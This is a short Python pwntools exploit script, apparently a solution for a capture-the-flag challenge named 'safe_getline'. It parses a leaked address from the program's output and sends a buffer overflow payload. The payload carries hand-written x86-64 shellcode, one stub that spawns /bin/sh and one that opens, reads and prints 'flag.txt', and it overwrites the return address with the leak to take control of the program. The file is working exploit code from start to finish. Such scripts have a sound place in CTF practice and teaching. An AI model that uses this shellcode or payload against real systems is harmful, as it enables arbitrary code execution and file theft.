from pwn import *
proc = process("./safe_getline")
#proc = remote("0.cloud.chals.io", 22110)
#proc.sendline("./safe_getline")

proc.recvuntil("`0x")
leak = proc.recvuntil("`.")
leak = leak[:len(leak)-2]
leak = int(leak,16)

print(hex(leak))
#gdb.attach(proc, gdbscript='break *0x401294')
binsh_shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
open_read_write_shellcode = b"\x6A\x74\x48\xB8\x2F\x66\x6C\x61\x67\x2E\x74\x78\x50\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x48\xC7\xC0\x02\x00\x00\x00\x0F\x05\x48\x83\xEC\x40\x48\x89\xE6\x48\x89\xC7\x48\xC7\xC0\x00\x00\x00\x00\x48\xC7\xC2\x40\x00\x00\x00\x0F\x05\x48\xC7\xC7\x01\x00\x00\x00\x48\x89\xE6\x48\x89\xC2\x48\xC7\xC0\x01\x00\x00\x00\x0F\x05"

shellcode = open_read_write_shellcode 

padding = 25 * b"A"

payload = shellcode + b"A" * (1024-len(shellcode)) + b"K" * 0x80000000+ padding + p64(leak)

proc.sendline(payload)

proc.interactive()